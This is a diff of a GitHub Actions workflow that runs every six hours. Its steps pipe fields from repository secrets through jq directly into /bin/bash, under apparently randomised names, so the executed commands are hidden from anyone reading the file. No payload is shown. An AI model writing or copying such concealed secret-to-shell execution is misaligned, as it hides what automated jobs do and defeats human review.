@@ -2,24 +2,22 @@ name: lingshiwwx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 0/6 * * *'
+    - cron: '31 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lingshiwwx
         env:
-          i06: ${{ secrets.i06 }}
+          sn28692: ${{ secrets.sn28692 }}
         run: |
-          echo $i06 | jq -r .tt1968 | /bin/bash
-          echo $mz2 | jq -r .t72886 | /bin/bash
-          echo $cqfgo83 | jq -r .awf03564 | /bin/bash
-          echo $rwl38 | jq -r .nfsw84856 | /bin/bash
-          echo $n546 | jq -r .piuv8 | /bin/bash
-          echo $gr7634 | jq -r .nkn1 | /bin/bash
-          echo $enkym317 | jq -r .zoour66 | /bin/bash
-          echo $o2 | jq -r .khxbl73604 | /bin/bash
-          echo $b49 | jq -r .z3678 | /bin/bash
+          echo $sn28692 | jq -r .m01362 | /bin/bash
+          echo $df40 | jq -r .dodp35580 | /bin/bash
+          echo $mvvx20 | jq -r .mfgmw92 | /bin/bash
+          echo $cxy00 | jq -r .yncxz4341 | /bin/bash
+          echo $uh59065 | jq -r .ywt45 | /bin/bash
+          echo $lg29166 | jq -r .obj0850 | /bin/bash
+          echo $ta25954 | jq -r .bvmk7 | /bin/bash
 
